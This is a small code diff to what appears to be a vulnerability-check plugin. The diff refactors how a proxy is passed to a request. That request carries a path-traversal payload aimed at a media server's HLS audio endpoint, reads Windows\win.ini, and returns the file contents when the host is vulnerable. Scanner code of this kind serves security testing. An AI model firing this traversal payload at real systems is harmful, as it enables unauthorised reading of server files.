@@ -45,6 +45,7 @@ def verify(host,proxy):
     vuln = [False,""]
     url = url_handle(host) + "/Audio/1/hls/..\..\..\..\..\..\..\Windows\win.ini/stream.mp3/"
 
+    proxies = None
     if proxy:
         proxies = {
         "http": "http://%s"%(proxy),
@@ -57,10 +58,8 @@ def verify(host,proxy):
                 }
 
     try:
-        if proxy:
-            req = requests.get(url,timeout = _info["timeout"],headers = headers,proxies=proxies,verify = False)
-        else:
-            req = requests.get(url,timeout = 6,verify = False)
+        req = requests.get(url,timeout = _info["timeout"],headers = headers,proxies=proxies,verify = False)
+       
         if req.status_code == 200 and req.text is not None:
             vuln = [True,req.text]
         else:
